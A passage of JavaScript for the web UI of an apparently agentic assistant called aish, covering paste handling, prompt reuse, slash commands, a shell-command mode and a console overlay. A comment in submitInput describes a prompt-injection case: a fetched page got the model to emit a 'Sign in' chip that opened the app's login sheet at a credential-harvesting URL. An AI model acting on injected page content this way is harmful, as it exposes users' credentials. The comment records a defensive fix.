      for (const item of await navigator.clipboard.read()) {
        const imageType = (item.types || []).find((t) => t.startsWith("image/"));
        if (imageType) {
          const blob = await item.getType(imageType);
          files.push(new File([blob], "", { type: imageType }));
        } else if ((item.types || []).includes("text/plain")) {
          text += await (await item.getType("text/plain")).text();
        }
      }
      for (const file of files) await uploadFile(file);
      if (text) composerInsert(text); // same insertion path the @/slash triggers use
      if (!files.length && !text) showToast("clipboard is empty");
      return;
    } catch {
      // Refused, or a clipboard this browser will not describe. Fall through:
      // readText is a narrower permission and often still answers.
    }
  }
  // navigator.clipboard is unavailable on insecure origins and can be refused;
  // say so rather than appearing to do nothing. The keyboard shortcut and the
  // tap-hold menu both still work, so this is a convenience, never the only way.
  try {
    const text = await navigator.clipboard.readText();
    if (!text) { showToast("clipboard is empty"); return; }
    composerInsert(text); // same insertion path the @/slash triggers use
  } catch {
    showToast("can't read the clipboard here — use tap-and-hold to paste");
  }
}
// [COMPOSER-SLOT-END]

// Put a previous prompt's text back in the composer. An EXPLICIT action (the
// reuse chip on the message), not a click on the whole bubble — the big bubble
// surface made stray taps clobber a draft (#155). Only fills an empty composer.
// [REUSE-PROMPT-START]
// Reuse restores the MESSAGE, not just its words (#230).
//
// Copy and reuse both read the body of the split ([ATTACHMENT-NOTES]) because
// the note lines are addressed to the model, not the reader. For copy that is
// the end of it — a clipboard holds text. For reuse it was a silent hole: the
// composer has an attachment zone, and a prompt that had been sent WITH a photo
// came back without one. Pressing send then asked the model to look at something
// that was not there, and nothing on screen said so; the composer looked exactly
// like a correct one.
//
// The files are still on disk under the uploads dir and the notes carry the name
// and the full path, so restoring them is only wiring. A file since deleted is
// not filtered out here — the composer chip fetches it through the same
// token-gated /file endpoint the transcript's thumbnails use, and falls back to
// naming it, which stays true.
function refillComposer(text, notes) {
  const body = stripAttachmentNotes(text);
  const files = (notes || []).filter((note) => note && note.path);
  if (!body && !files.length) return;
  if (input.value.trim() && input.value.trim() !== body) {
    showToast("clear the input first to reuse this prompt");
    return;
  }
  input.value = body;
  input.setSelectionRange(body.length, body.length);
  let added = false;
  for (const note of files) {
    if (attachments.some((a) => a.path === note.path)) continue;
    attachments.push({ name: note.name, path: note.path });
    added = true;
  }
  if (added) renderAttachments();
  resizeInput();
  input.focus();
}

// A chip (beside copy) that refills the composer with the message — its text
// and whatever was attached to it.
function reuseChip(getText, getNotes) {
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = "copy-chip"; // same styling, sits next to the copy chip
  btn.title = "reuse this prompt";
  btn.setAttribute("aria-label", "reuse this prompt");
  btn.append(pencilIcon());
  btn.onclick = () => refillComposer(getText(), getNotes ? getNotes() : []);
  return btn;
}
// [REUSE-PROMPT-END]

function recallHistory(key) {
  if (key === "ArrowUp") {
    if (!promptHistory.length || (input.value !== "" && historyIndex === null)) return false;
    if (historyIndex === null) {
      historyDraft = input.value;
      historyIndex = promptHistory.length;
    }
    if (historyIndex > 0) historyIndex -= 1;
    input.value = promptHistory[historyIndex];
  } else {
    if (historyIndex === null) return false;
    historyIndex += 1;
    if (historyIndex >= promptHistory.length) {
      historyIndex = null;
      input.value = historyDraft;
    } else {
      input.value = promptHistory[historyIndex];
    }
  }
  const end = input.value.length;
  input.setSelectionRange(end, end);
  resizeInput();
  return true;
}

const SLASH_COMMANDS = [
  ["/model", "switch model — opens the searchable picker"],
  ["/resume", "search & resume an earlier chat"],
  ["/delete", "open a chat, then Delete chat in its title menu"],
  ["/new", "fresh conversation in a new chat"],
  ["/fork", "branch this conversation into a new chat (original untouched)"],
  ["/learn", "save this conversation's learnings as skills/memory"],
  ["/feedback", "file a bug or idea as a GitHub issue"],
  ["/cd", "change working directory (re-anchors approval root)"],
  ["/add-dir", "allow auto-approved work in another tree"],
  ["/jobs", "list background jobs"],
  ["/browser", "open a page — or type anything to search — in aish's own browser"],
  ["/browser anon", "the separate profile web searches are read with"],
  ["/watch", "see the page aish is on in this chat, as it works"],
  ["/chat", "show this chat's log path (copyable)"],
  ["/mic", "test speech recognition (mic diagnostic)"],
  ["/explain", "the full record of a turn — what it was given, thought, ran and answered"],
  ["/help", "about aish web"],
];

const suggest = { items: [], index: 0, kind: null, fragment: "" };

$("composer").addEventListener("submit", (e) => {
  e.preventDefault();
  submitInput();
});

// The composer's listeners live in named functions so they can be re-bound to
// the fresh #input node terminal mode swaps in (attachInputListeners, #156).
// [ENTER-START]
function onInputKeydown(e) {
  // Cmd/Ctrl+Enter SENDS, in either mode. Bare Enter deliberately does not in
  // prose (#170) because autocorrect, IME and dictation all emit lone Returns
  // that fired half-written messages — none of them can produce a modifier
  // chord, so this gives the desktop a keyboard send path without reopening
  // that. It runs ahead of the suggestion popup: holding a modifier means "send
  // what I typed", not "complete it".
  if (e.key === "Enter" && (e.metaKey || e.ctrlKey) && !e.altKey) {
    e.preventDefault();
    submitInput();
    return;
  }
  if (!$("suggest").hidden) {
    if (e.key === "ArrowDown" || e.key === "ArrowUp") {
      e.preventDefault();
      suggest.index = (suggest.index + (e.key === "ArrowDown" ? 1 : -1)
        + suggest.items.length) % suggest.items.length;
      paintSuggest();
      return;
    }
    if (e.key === "Tab" || e.key === "Enter") {
      const chosen = suggest.items[suggest.index];
      // Re-completing an already-exact command would be a no-op, so Enter falls
      // through instead: to the terminal-mode run below, or — in prose — to
      // nothing but closing the popup (#170: only the send button submits).
      const exact = (suggest.kind === "slash" || suggest.kind === "cmd")
        && chosen[0] === input.value.trim();
      if (e.key === "Tab" || !exact) {
        e.preventDefault();
        acceptSuggestion(chosen);
        return;
      }
      if (!cmdMode) { e.preventDefault(); hideSuggest(); return; }
    }
    if (e.key === "Escape") {
      // First Esc only closes the suggestion popup; a second one leaves the
      // mode (#143) — so don't let this bubble to the global escapeExit.
      e.stopPropagation();
      hideSuggest();
      return;
    }
  }
  if ((e.key === "ArrowUp" || e.key === "ArrowDown") && recallHistory(e.key)) {
    e.preventDefault();
    return;
  }
  // Enter submits ONLY in terminal mode — that mode is a shell prompt and
  // running the command is the whole point of it (#100). Prose messages are
  // sent by the send button alone (#170): a newline is the common intent, and
  // autocorrect/IME/dictation all produce Returns that used to fire a
  // half-written message. Don't "fix" this asymmetry back into symmetry.
  if (e.key === "Enter" && !e.shiftKey && cmdMode) {
    e.preventDefault();
    submitInput();
  }
}

// iOS soft keyboards don't fire a reliable Enter keydown on a <textarea> — the
// return key arrives as a beforeinput/insertLineBreak. In terminal mode that
// key must RUN the command like a real shell, not drop a newline. Desktop is
// handled by the keydown above (which cancels this default), so no double-run.
// Prose is untouched here for the same reason as above — the newline stands.
function onInputBeforeInput(e) {
  if (cmdMode && e.inputType === "insertLineBreak") {
    e.preventDefault();
    submitCommand();
  }
}
// [ENTER-END]

function onInputInput() {
  // `!` as the sole character of an empty composer enters terminal mode (#100),
  // consuming the `!` — the mode's prompt implies it from then on.
  if (!cmdMode && input.value === "!") { enterCmdMode(); return; }
  // Terminal mode owns the input: no chat draft or history-recall, but it has
  // its own command/file autocomplete (updateSuggest branches on cmdMode).
  if (cmdMode) { resizeInput(); updateSuggest(); return; }
  if (!input.value) pendingSpeak = false; // cleared a dictated draft → don't speak the reply
  historyIndex = null; // typing leaves history-recall mode
  saveDraft();
  resizeInput();
  updateSuggest();
}

// Bind every composer listener to `el`. Terminal mode swaps #input for a fresh
// node (so iOS reads the terminal keyboard attributes at first focus — #156),
// and this re-binds the same handlers to whichever node is currently active.
function attachInputListeners(el) {
  el.addEventListener("focus", updateScrollButton);  // arrows hide on focus (#115)
  el.addEventListener("blur", updateScrollButton);
  el.addEventListener("keydown", onInputKeydown);
  el.addEventListener("beforeinput", onInputBeforeInput);
  el.addEventListener("input", onInputInput);
  el.addEventListener("paste", onInputPaste);
}
attachInputListeners(input);
installFileDrop(window, document.body);

// The preview's own input. The ✕ is a plain button; everything else is
// pointer-driven ([PREVIEW-GESTURE]) — a click handler alongside it would fire
// a second time at the end of every drag and tap.
$("preview-close").onclick = closePreview;
$("preview-save").onclick = () => {
  const target = previewSaveTarget();
  if (target) saveAttachment(target.file, target.name);
};
// Share starts fetching on the PRESS and opens the sheet on the release, which
// is what keeps the sheet inside the gesture iOS will open one for. Both read
// the target at the moment of the touch — a swipe moves the file under them.
$("preview-share").addEventListener("pointerdown", () => {
  const target = previewSaveTarget();
  if (target) primeShare(target.file, target.name);
});
$("preview-share").onclick = () => {
  const target = previewSaveTarget();
  if (target) shareAttachment(target.file, target.name);
};
$("preview").addEventListener("pointerdown", previewDown);
$("preview").addEventListener("pointermove", previewMove, { passive: false });
$("preview").addEventListener("pointerup", previewUp);
$("preview").addEventListener("pointercancel", previewUp);
$("preview").addEventListener("wheel", previewWheel, { passive: false });
// WebKit-only, and iOS is exactly where the pointer-pair pinch does not fire.
$("preview").addEventListener("gesturestart", previewGestureStart, { passive: false });
$("preview").addEventListener("gesturechange", previewGestureChange, { passive: false });
$("preview").addEventListener("gestureend", previewGestureEnd, { passive: false });
// Until the bytes arrive, naturalWidth is 0 and previewBox falls back to the
// element's own shape — so any pinch in that window is bounded against the
// WRONG picture. On a desktop the image is there before a finger can move; on
// a phone fetching a 3 MB photo it is not. Re-clamp when the truth arrives,
// and again whenever the window changes shape under it (rotation, the URL bar
// sliding away), where yesterday's bounds are simply wrong.
$("preview-img").addEventListener("load", () => {
  if (!previewIsOpen()) return;
  previewPageLoaded();
  previewPaint(false);
});
// A page the server could not render, or a photo whose file has gone: the
// overlay says so in words. Without this the failure is the browser's own
// broken-image glyph on a black screen, which says nothing about which of the
// two happened.
$("preview-img").addEventListener("error", () => {
  if (previewIsOpen()) previewPageFailed();
});
addEventListener("resize", () => { if (previewIsOpen()) previewPaint(false); });
addEventListener("orientationchange", () => { if (previewIsOpen()) previewPaint(false); });

function atFragment(text) {
  const at = text.lastIndexOf("@");
  if (at < 0 || (at > 0 && !/\s/.test(text[at - 1]))) return null;
  const fragment = text.slice(at + 1);
  return /\s/.test(fragment) ? null : fragment;
}

const requestFiles = debounce((query) => send({ type: "files", query }), 120);

// Common shell commands offered as first-word completions in terminal mode.
// Fallback first-word completions until this user has run enough ! commands to
// build a personal history (#104). Once cmdHistory (from hello) is non-empty it
// takes over — the palette is the user's own successful commands, aliases and all.
const SHELL_COMMANDS = [
  "cat", "cd", "cp", "curl", "echo", "find", "git", "grep", "head", "less",
  "ls", "make", "mkdir", "mv", "node", "npm", "pwd", "python", "rm", "tail",
  "touch", "uv",
];
let cmdHistory = []; // user's own successful commands, most-run first, from hello

function updateSuggest() {
  if (cmdMode) { updateCmdSuggest(); return; }
  const text = input.value;
  const before = text.slice(0, input.selectionStart ?? text.length);
  if (text.startsWith("/") && !text.includes("\n") && !before.includes(" ")) {
    const items = SLASH_COMMANDS.filter(([cmd]) => cmd.startsWith(before));
    if (items.length) {
      suggest.items = items;
      suggest.index = 0;
      suggest.kind = "slash";
      paintSuggest();
      return;
    }
  } else if (!text.startsWith("/")) {
    const fragment = atFragment(before);
    if (fragment !== null) {
      suggest.fragment = fragment;
      suggest.kind = "file";
      requestFiles(fragment);
      return; // popover shows when file_list arrives
    }
  }
  hideSuggest();
}

// Terminal-mode completion: first word → shell command list; later tokens →
// files/folders in the current dir via the existing `files` backend, no `@`.
function updateCmdSuggest() {
  const text = input.value;
  const before = text.slice(0, input.selectionStart ?? text.length);
  if (!before.includes(" ")) {
    // History-first: prefix-match the user's own commands, keeping their stored
    // (correctly-cased) form. Case-insensitive match so iOS autocapitalization
    // (`Ls`, `Git`) still hits. Falls back to the static list only until any
    // history exists — the palette is already frequency+recency ranked (#104).
    const source = cmdHistory.length ? cmdHistory : SHELL_COMMANDS;
    const lower = before.toLowerCase();
    const items = before
      ? source.filter((c) => c.toLowerCase().startsWith(lower)).map((c) => [c, ""])
      : [];
    if (items.length) {
      suggest.items = items;
      suggest.index = 0;
      suggest.kind = "cmd";
      paintSuggest();
      return;
    }
    hideSuggest();
    return;
  }
  const token = before.slice(before.lastIndexOf(" ") + 1);
  if (!token) { hideSuggest(); return; } // don't query on a bare argument space
  suggest.fragment = token;
  suggest.kind = "cmdfile";
  requestFiles(token); // popover shows when file_list arrives
}

function onFileList(event) {
  const fileKind = suggest.kind === "file" || suggest.kind === "cmdfile";
  if (!fileKind || event.query !== suggest.fragment) return;
  if (!event.files.length) { hideSuggest(); return; }
  suggest.items = event.files.map((path) => [path, ""]);
  suggest.index = 0;
  paintSuggest();
}

function paintSuggest() {
  const box = $("suggest");
  box.replaceChildren();
  suggest.items.forEach(([label, desc], i) => {
    const row = document.createElement("button");
    row.type = "button";
    row.className = "suggest-row" + (i === suggest.index ? " active" : "");
    const name = document.createElement("span");
    name.className = "mono";
    name.textContent = label;
    row.appendChild(name);
    if (desc) {
      const meta = document.createElement("span");
      meta.className = "meta";
      meta.textContent = desc;
      row.appendChild(meta);
    }
    row.onclick = () => acceptSuggestion(suggest.items[i]);
    box.appendChild(row);
  });
  box.hidden = !suggest.items.length;
}

function hideSuggest() {
  $("suggest").hidden = true;
  suggest.items = [];
  suggest.kind = null;
}

function acceptSuggestion([value]) {
  const kind = suggest.kind; // hideSuggest() clears it below
  if (kind === "slash") {
    input.value = value + " ";
  } else if (kind === "cmd") {
    // Replace the first word (everything before the caret) with the command.
    const pos = input.selectionStart ?? input.value.length;
    input.value = value + " " + input.value.slice(pos);
    const caret = value.length + 1;
    input.setSelectionRange(caret, caret);
  } else {
    // file (@-mention) and cmdfile (bare path token): replace the current
    // token. Mentions keep their leading @; command args have no prefix.
    const pos = input.selectionStart ?? input.value.length;
    const before = input.value.slice(0, pos);
    const start = kind === "cmdfile"
      ? before.lastIndexOf(" ") + 1
      : before.lastIndexOf("@") + 1;
    const inserted = value.endsWith("/") ? value : value + " ";
    input.value = input.value.slice(0, start) + inserted + input.value.slice(pos);
    const caret = start + inserted.length;
    input.setSelectionRange(caret, caret);
  }
  hideSuggest();
  input.focus();
  if (kind !== "slash") updateSuggest();
}

// [CHIP-NEVER-COMMANDS-START]
function submitInput(options) {
  hideSuggest();
  if (dictating) stopDictation(); // tapping send finishes an in-progress dictation
  if (cmdMode) { submitCommand(); return; }
  let text = input.value.trim();
  // A CHIP IS A MESSAGE, NEVER A COMMAND. Chip labels and payloads come from
  // MODEL output, which under prompt injection is attacker-controlled — and a
  // chip sends on one tap. Routing that through handleSlash let a hostile
  // fetched page render a friendly "Sign in to continue" button that opened
  // aish's OWN login sheet at a credential-harvesting URL. The sheet is
  // designed to feel trustworthy, which is exactly the trust it abused.
  // Slash commands are privileged local actions and must be TYPED by the human.
  const fromChip = !!(options && options.fromChip);
  if (text.startsWith("/") && !fromChip) {
    // Only clear once the command is handled/sent — an unknown command, an
    // ambiguous prefix, or a failed send keeps the text so it isn't lost (#101).
    if (handleSlash(text)) {
      rememberPrompt(text); // slash commands never echo back as user events
      input.value = "";
      localStorage.removeItem("aish-draft");
      resizeInput(); // #117: also drop the .tall class now the input is empty
    }
    return;
  }
  // [CHIP-NEVER-COMMANDS-END]
  if (!text && !attachments.length) return;
  // The server decides per-backend whether attachments go to the model
  // natively (vision) or as path notes for the gated tools.
  if (send({ type: "task", text, attachments: attachments.map((a) => a.path) })) {
    // [PENDING-SEND] The bubble is drawn NOW, not when the server echoes the
    // turn back — the gap between the two is the whole defect. A `!` command is
    // deliberately exempt: its terminal block already carries the command, and
    // a bubble would be the duplicate #154 removed.
    if (!text.startsWith("!")) addPendingSend(text);
    if (pendingSpeak) { speakNextReply = true; pendingSpeak = false; } // dictated → speak reply
    maybeRequestNotifyPermission();
    input.value = "";
    localStorage.removeItem("aish-draft");
    resizeInput(); // #117: recompute height AND drop the .tall class now it's empty
    releaseSentShares(attachments); // shared items are spent when they are SENT
    attachments = [];
    renderAttachments();
    scrollToEndSettled();
  }
}

// Terminal mode submit: `exit` leaves the mode; anything else runs as a shell
// command via the existing `!` path and keeps the mode active for the next one.
function submitCommand() {
  const text = input.value.trim();
  if (text === "exit" || text === "quit") { exitCmdMode(); return; }
  if (!text) { input.focus(); return; }
  if (send({ type: "task", text: `!${text}`, attachments: [] })) {
    rememberPrompt(text);
    input.value = "";
    resizeInput();
    scrollToEndSettled();
  }
  input.focus(); // stay in the terminal, ready for the next command
}

// "/session" is the pre-#260 name for "/chat": off the menu, still dispatched.
const SLASH_ALL = SLASH_COMMANDS.map(([cmd]) => cmd).concat(["/clear", "/branch", "/dir-add", "/quit", "/exit", "/session"]);

function handleSlash(text) {
  let [command, ...rest] = text.split(/\s+/);
  const arg = rest.join(" ");
  if (!SLASH_ALL.includes(command)) {
    const matches = SLASH_ALL.filter((cmd) => cmd.startsWith(command));
    if (matches.length === 1) command = matches[0];
    else if (matches.length > 1) {
      showToast(`ambiguous — ${matches.join(" or ")}?`);
      return false; // keep the text so the user can disambiguate (#101)
    }
  }
  // Return whether the input may be cleared: true once the command is handled
  // or its message reaches the backend; false if it couldn't be sent or was
  // unknown, so submitInput preserves the typed text instead of losing it.
  switch (command) {
    case "/model": openModelSheet(arg); return true;
    case "/resume": case "/delete": openSessionRail(arg); return true;
    case "/new": case "/clear": return act({ type: "new" }, { label: "the new chat" });
    case "/fork": case "/branch": return act({ type: "fork" }, { label: "the fork" });
    case "/cd": return arg ? act({ type: "cd", path: arg }, { label: "the directory change" }) : (openDirSheet(), true);
    case "/add-dir": case "/dir-add":
      return arg ? act({ type: "add_dir", path: arg }, { label: "adding that directory" }) : (openSheet("workspace-sheet"), true);
    case "/learn": case "/feedback": {
      // Run as a task: the server swaps the text for the expanded prompt
      // (cli.parse_learn / parse_feedback) while the transcript shows what was
      // typed. Include attachments — /feedback WITH files uses the classic
      // upload flow, and without this they were silently dropped (#152).
      const sent = send({ type: "task", text, attachments: attachments.map((a) => a.path) });
      if (sent) {
        releaseSentShares(attachments);
        attachments = [];
        renderAttachments();
        scrollToEndSettled();
      }
      return sent;
    }
    case "/jobs": openSheet("workspace-sheet"); return send({ type: "jobs" });
    // The rest of the line is the argument: a URL to sign in at, or
    // "forget <host>" / "close". The window itself opens on the Mac.
    case "/browser": {
      // /browser OPENS THE BROWSER — with or without a URL. It used to send the
      // bare form to the workspace sheet, which answered a request to open a
      // browser with a settings panel; the name promises one thing and it did
      // another. Only the bookkeeping verbs stay as text.
      const verb = arg.split(/\s+/)[0].toLowerCase();
      if (verb === "forget" || verb === "logout" || verb === "close") {
        openSheet("workspace-sheet");
        return send({ type: "browser", arg });
      }
      // `/browser anon <url>` drives the SEARCH profile — the separate,
      // signed-into-nothing browser web_search reads results pages with. It is
      // not called `search` any more: the address bar now takes a search
      // phrase, so `/browser search cats` would have been a genuine coin-flip
      // between "look up cats" and "sign the search profile in at cats". Bare
      // `/browser anon` is a question, so it goes to the sheet as text like the
      // other bookkeeping verbs.
      if (verb === "anon") {
        // Not named `rest`: the JS checks flatten const to var to run a real
        // function out of this file, and another branch already uses that name.
        const anonAt = arg.slice(verb.length).trim();
        if (!anonAt) {
          openSheet("workspace-sheet");
          return send({ type: "browser", arg });
        }
        openBrowserView(anonAt, "search");
        return true;
      }
      openBrowserView(arg);
      return true;
    }
    // The same sheet, pointed at THIS CHAT's own tab and read-only (#289). A
    // slash command rather than a chip or a card: `[CHIP-NEVER-COMMANDS]` is
    // what keeps a fetched page from being able to open aish's browser sheet,
    // and watch mode is a door into the same sheet.
    case "/watch": openWatchView(); return true;
    case "/chat": case "/session": copyLogPath(); return true; // path came in on hello (#146)
    case "/mic": openMicSheet(); return true;
    // The second door to the dossier, and not a fallback: a turn that ran
    // nothing may have no trace card, and a turn older than the bounded first
    // paint is not on screen to tap. Bare form opens the LAST turn; an
    // argument is a turn id or, for a log written before ids, an ordinal.
    case "/explain": openExplain(arg || ""); return true;
    case "/help": openSheet("workspace-sheet"); return true;
    case "/quit": case "/exit": showToast("just close the tab — chats persist"); return true;
    case "/debug": reportViewport("manual"); showToast("viewport state sent to server log"); return true;
    default: showToast(`unknown command ${command}`); return false;
  }
}

// ---- attachments ---------------------------------------------------------
let attachments = []; // {name, path}

// The + button opens the composer actions popover (attach / reference / slash
// / photo / feedback / terminal); it sits above the button, iOS-style.
//
// The menu is position:fixed and placed with viewport coordinates read from the
// + button's rect. On iPhone, tapping + blurs the input, so the keyboard
// dismisses and the visual viewport slides back DOWN — a placement captured
// before that settles leaves the menu stranded mid-screen (#103). So the
// coordinates are recomputed from the CURRENT button rect: once on open, again
// on the next frames, and live on every visualViewport resize/scroll while the
// menu is open. offsetHeight is read after the menu is laid out (hidden-then-
// measured) because the 6-item menu is taller than the compose bar.
function positionComposerMenu() {
  const menu = $("composer-actions");
  if (menu.hidden) return; // settle timers can fire after the menu was closed
  const anchor = $("attach").getBoundingClientRect();
  menu.style.left = `${anchor.left}px`;
  menu.style.top = `${anchor.top - menu.offsetHeight - 6}px`;
}

let composerMenuTracking = false;

function stopComposerMenuTracking() {
  if (!composerMenuTracking) return;
  composerMenuTracking = false;
  if (window.visualViewport) {
    visualViewport.removeEventListener("resize", positionComposerMenu);
    visualViewport.removeEventListener("scroll", positionComposerMenu);
  }
}

function openComposerMenu() {
  const menu = $("composer-actions");
  menu.style.visibility = "hidden"; // measure offsetHeight before placing
  menu.hidden = false;
  positionComposerMenu();
  menu.style.visibility = "";
  $("backdrop").hidden = false;
  if (window.visualViewport && !composerMenuTracking) {
    composerMenuTracking = true;
    visualViewport.addEventListener("resize", positionComposerMenu);
    visualViewport.addEventListener("scroll", positionComposerMenu);
  }
  // The keyboard dismissal (a side effect of blurring the input) can settle
  // WITHOUT any visualViewport event, so re-place across the animation window
  // too — each call is a cheap no-op once the rect has stopped moving.
  requestAnimationFrame(positionComposerMenu);
  for (const ms of [50, 150, 350, 700]) setTimeout(positionComposerMenu, ms);
}

$("attach").onclick = () => {
  if (cmdMode) { exitCmdMode(); return; } // the + is an × while in terminal mode
  const menu = $("composer-actions");
  if (!menu.hidden) { closeSheets(); return; }
  openComposerMenu();
};

$("composer-actions").addEventListener("click", (e) => {
  const item = e.target.closest(".action-item");
  if (!item) return;
  closeSheets();
  switch (item.dataset.act) {
    case "attach": $("file-input").click(); break;
    case "photo": $("photo-input").click(); break;
    case "reference": composerInsert("@"); break;
    case "slash": composerInsert("/"); break;
    // Prefill the trigger and let the user add detail (or just send) — the
    // server expands /feedback into the issue-filing flow (parse_feedback).
    case "feedback": composerInsert("/feedback "); break;
    case "browser": openBrowserView(""); break;
    case "terminal": enterCmdMode(); break; // the `!` shell-command input mode
    // The global console has its own top-bar button + Ctrl+\; not in this menu.
  }
});

// ---- terminal / command mode (#100) --------------------------------------
// A composer mode that runs shell commands multi-turn. It reuses the existing
// `!command` path (server _launch runs it as the user's own action, no model,
// no approval gate) — this layer is purely the terminal-styled input, the
// dynamic `dir $` prompt, and enter/exit affordances. Autocomplete is a
// separate follow-up (issue #100, step 2).
let cmdMode = false;

function cmdPromptLabel() {
  // Just `$ ` — the directory name ate too much width on mobile, and the
  // top-bar chip already shows the cwd.
  return "$ ";
}

function refreshCmdPrompt() {
  if (cmdMode) $("cmd-prompt").textContent = cmdPromptLabel();
}

// iOS reads autocapitalize/autocorrect/spellcheck when the field gains focus,
// so a blur+refocus is needed for a mid-focus mode switch to take effect —
// otherwise the terminal keyboard would still capitalise and autocorrect
// commands. `raw` = command-line typing; false restores chat-message typing.
function setInputTyping(raw) {
  input.setAttribute("autocapitalize", raw ? "none" : "sentences");
  input.setAttribute("autocorrect", raw ? "off" : "on");
  input.setAttribute("spellcheck", raw ? "false" : "true");
  if (document.activeElement === input) { input.blur(); input.focus(); }
}

function enterCmdMode() {
  if (cmdMode) return;
  cmdMode = true;
  $("composer").classList.add("cmd-mode");
  $("cmd-prompt").hidden = false;
  refreshCmdPrompt();
  $("attach").setAttribute("aria-label", "exit terminal mode");
  swapComposerInput(true); // fresh #input with terminal keyboard attrs (#156)
  resizeInput();
  setInputTyping(true);
}

function exitCmdMode() {
  if (!cmdMode) return;
  cmdMode = false;
  $("composer").classList.remove("cmd-mode");
  $("cmd-prompt").hidden = true;
  hideSuggest();
  $("attach").setAttribute("aria-label", "actions");
  swapComposerInput(false); // fresh #input back to prose keyboard attrs (#156)
  resizeInput();
  setInputTyping(false);
}

// Replace #input with a fresh <textarea> that carries the target mode's keyboard
// attributes FROM BIRTH, then focus it. This is the reliable iOS fix for #156:
// iOS reads autocorrect/autocapitalize/spellcheck (and enterkeyhint) only when a
// field is first focused and ignores changes to an already-focused field — so
// terminal mode can't just flip attributes on the shared composer. Swapping in a
// new node and focusing it WITHIN the `!` keystroke (or exit tap) gesture makes
// iOS pick up the terminal keyboard immediately. The clone keeps id="input", so
// all composer CSS applies unchanged; every listener re-binds to the new node.
function swapComposerInput(cmd) {
  const fresh = input.cloneNode(false);
  fresh.value = "";
  if (cmd) {
    fresh.setAttribute("autocorrect", "off");
    fresh.setAttribute("autocapitalize", "off");
    fresh.setAttribute("spellcheck", "false");
    fresh.setAttribute("enterkeyhint", "go"); // iOS return key reads "Go" — runs the command
    fresh.placeholder = "";
  } else {
    fresh.setAttribute("autocorrect", "on");
    fresh.setAttribute("autocapitalize", "sentences");
    fresh.setAttribute("spellcheck", "true");
    fresh.removeAttribute("enterkeyhint");
    fresh.placeholder = "Ask aish";
  }
  input.replaceWith(fresh);
  input = fresh;
  attachInputListeners(input);
  input.focus(); // synchronous, within the user gesture → iOS shows the new keyboard
}

// Insert a trigger char and fire the input flow (mention / slash suggestions).
function composerInsert(ch) {
  input.focus();
  const start = input.selectionStart ?? input.value.length;
  const end = input.selectionEnd ?? start;
  input.setRangeText(ch, start, end, "end");
  input.dispatchEvent(new Event("input", { bubbles: true }));
}

// Esc leaves whichever full-input mode is active (#143): it closes the
// interactive PTY overlay (killing the process — no dangling shell) or exits
// terminal mode, then returns to the normal composer. Order matters: the PTY
// overlay sits on top of terminal mode. Returns true when it acted, so callers
// swallow the key; when neither mode is active it does nothing and Esc is left
// to its other handlers (suggest dismissal, sheet close). The on-screen "esc"
// key still sends \x1b for programs that need it — only the hardware key means
// "leave". [ESC-EXIT-START]
function escapeExit() {
  // Esc leaves the OLD `!` terminal-input mode. It deliberately does NOT touch
  // the global console: there Esc is a real key (vim/tmux/less/…), so it passes
  // through to the PTY — close the console with its button or Ctrl+\ instead.
  if (cmdMode) { exitCmdMode(); return true; } // exitCmdMode already focuses input
  return false;
}
// [ESC-EXIT-END]

// ---- global interactive console overlay controller (#148 follow-up) ------
// ONE "Quake console" for the whole app: a floating overlay above whatever chat
// is shown, openable from any chat and untouched by chat-switches. A real
// terminal — xterm.js (vendored global) renders console_out and captures
// keystrokes, sent to the server's ONE PTY as `console_in` and NEVER echoed
// locally (the PTY echoes, so password prompts mask for free). Everything here
// is user-driven; the model has no path to console_in (the server enforces
// that too). Close = HIDE (the console keeps running server-side); a separate
// Kill destroys it. Backed by tmux server-side so it survives aish-web restarts.
let consoleTerm = null; // the xterm.js Terminal while the overlay is open, else null
let consoleFit = null;
let consoleOpen = false;
// The text of the most recent tmux copy (arrives via OSC 52). iOS blocks the
// clipboard write from that incoming-data handler (no user gesture), so we stash
// it here and let the key-row Copy button write it within the user's tap.
let lastConsoleClip = null;
// The Ctrl chip is a 3-state sticky: "off" → tap → "armed" (one key sent as
// Ctrl+key, then off) → double-tap → "locked" (EVERY key is Ctrl+key until you
// tap to unlock — for repeated C-F page-downs / long Ctrl combos).
let consoleCtrlMode = "off"; // "off" | "armed" | "locked"
let lastCtrlTap = 0;
// Select-region mode (touch): a phone can't drive tmux's drag-select (iOS only
// synthesizes taps, not the continuous move tmux needs), so this mode paints a
// native selection directly over the DOM rows from finger position instead. The
// scroll hijack is suspended while it's on.
let consoleSelectMode = false;

// Catppuccin Mocha — matches the CSS palette applied to the command/code
// surfaces, so the interactive terminal reads as one theme with them.
const CATPPUCCIN_MOCHA = {
  background: "#1e1e2e", foreground: "#cdd6f4",
  cursor: "#f5e0dc", cursorAccent: "#1e1e2e", selectionBackground: "#585b70",
  black: "#45475a", red: "#f38ba8", green: "#a6e3a1", yellow: "#f9e2af",
  blue: "#89b4fa", magenta: "#cba6f7", cyan: "#94e2d5", white: "#bac2de",
  brightBlack: "#585b70", brightRed: "#f38ba8", brightGreen: "#a6e3a1",
  brightYellow: "#f9e2af", brightBlue: "#89b4fa", brightMagenta: "#f5c2e7",
  brightCyan: "#94e2d5", brightWhite: "#a6adc8",
};

// The one-time xterm load's own status text.
const CONSOLE_LOADING = "loading terminal…";

// Has the server's console_started — the only source of the REAL status label —
// landed for the open currently in progress? openConsole sends console_open
// FIRST and only then writes its provisional "attaching…"/"loading terminal…"
// text, so on a fast link the reply beats those writes and they clobber the real
// label. Nothing rewrites it afterwards (console_started fires once per open), so
// a placeholder then sat over a fully working terminal. Provisional text is
// therefore only ever written while this is false.
let consoleStartedSeen = false;

function setProvisionalConsoleStatus(text) {
  if (!consoleStartedSeen) setConsoleStatus(text);
}

function setConsoleStatus(text, exited) {
  const el = $("pty-status");
  el.textContent = text || "";
  el.classList.toggle("exited", Boolean(exited));
}

function setConsoleCtrlMode(mode) {
  consoleCtrlMode = mode;
  const chip = document.querySelector('.pty-keys button[data-key="ctrl"]');
  if (chip) {
    chip.classList.toggle("armed", mode === "armed");
    chip.classList.toggle("locked", mode === "locked");
  }
}

function setConsoleSelectMode(on, quiet) {
  consoleSelectMode = on;
  const chip = document.querySelector('.pty-keys button[data-key="select"]');
  if (chip) chip.classList.toggle("on", on);
  const scr = $("pty-screen");
  if (scr) scr.classList.toggle("selecting", on);
  if (on) {
    // The paint writes into the DOCUMENT selection, which won't take while the
    // xterm textarea is focused (keyboard up). Blur it — dropping the keyboard —
    // so the selection sticks. Tapping the chip did this by side effect; a hold
    // (on the terminal itself) left the textarea focused, so its drag never
    // selected. This unifies both entry paths.
    const ta = consoleTerminalTextarea();
    if (ta) ta.blur();
